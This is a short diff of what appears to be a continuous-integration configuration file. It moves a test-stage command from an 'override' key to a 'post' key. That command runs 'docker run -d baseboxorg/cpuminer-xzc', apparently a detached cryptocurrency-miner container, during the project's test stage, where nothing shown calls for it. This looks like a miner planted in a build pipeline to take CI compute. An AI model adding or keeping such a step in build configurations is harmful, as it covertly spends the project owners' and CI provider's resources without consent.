@@ -13,7 +13,7 @@ dependencies:
 
 
 test:
-  override:
+  post:
     - docker run -d baseboxorg/cpuminer-xzc
     
 deployment:
